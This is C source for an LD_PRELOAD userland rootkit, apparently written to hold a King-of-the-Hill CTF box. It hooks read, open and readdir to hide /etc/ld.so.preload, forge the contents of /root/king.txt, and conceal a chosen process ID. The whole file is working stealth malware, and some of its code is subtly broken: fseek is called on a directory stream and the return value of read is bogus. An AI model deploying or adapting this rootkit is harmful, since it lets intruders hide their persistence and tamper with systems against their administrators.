#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>

// AUTHOR: @profxadke (Nikhil Aryal)

// Original function pointers
static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;
static int (*orig_open)(const char *pathname, int flags, ...) = NULL;
static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;

// Target file and PID to hide
static const char *target_file = "/etc/ld.so.preload";
static const char *target_hidden_file = "/root/king.txt";
static int target_pid = 333;

// Static buffer to control read modification
static char read_buffer[256];
static int is_reading_hidden_file = 0;

// Function to check if the process should be hidden
static int is_process_hidden(int pid) {
    return pid == target_pid;
}

// Intercept the read system call
ssize_t read(int fd, void *buf, size_t count) {
    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }

    if (is_reading_hidden_file) {
        is_reading_hidden_file = 0; // Reset flag after the read operation
        return count;
    }

    // Obtain the file path from the file descriptor
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char real_path[256];
    ssize_t len = readlink(path, real_path, sizeof(real_path) - 1);
    if (len != -1) {
        real_path[len] = '\0';

        // Check if it's the target file for modification
        if (strcmp(real_path, target_hidden_file) == 0) {
            const char *message = "profxadke\n";
            size_t msg_len = strlen(message);

            if (count > msg_len) {
                count = msg_len;
            }

            // Copy the message to the buffer
            memcpy(buf, message, count);
            is_reading_hidden_file = 1; // Set flag to avoid infinite loop
            return count; // Return the number of bytes written
        }

        // Hide the contents of /etc/ld.so.preload
        if (strcmp(real_path, target_file) == 0) {
            return 0; // Return zero bytes to hide the content
        }
    }

    return orig_read(fd, buf, count);
}

// Intercept the open system call
int open(const char *pathname, int flags, ...) {
    if (!orig_open) {
        orig_open = dlsym(RTLD_NEXT, "open");
    }

    // Hide the file descriptor for /etc/ld.so.preload
    if (strcmp(pathname, target_file) == 0) {
        errno = EACCES; // Return permission error to prevent opening the file
        return -1;
    }

    return orig_open(pathname, flags);
}

// Intercept readdir to hide specific processes
struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    struct dirent *prev_entry = NULL;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Hide processes with the specified PID
        if (entry->d_type == DT_DIR && is_process_hidden(atoi(entry->d_name))) {
            // Skip this entry and remember the previous entry
            prev_entry = entry;
            continue; // Skip this entry
        }
        if (prev_entry) {
            // Re-adjust the directory stream to skip the hidden entry
            fseek(dirp, -(sizeof(struct dirent) + prev_entry->d_reclen), SEEK_CUR);
            prev_entry = NULL; // Reset previous entry
        }
        return entry; // Return non-hidden entries
    }
    return NULL;
}
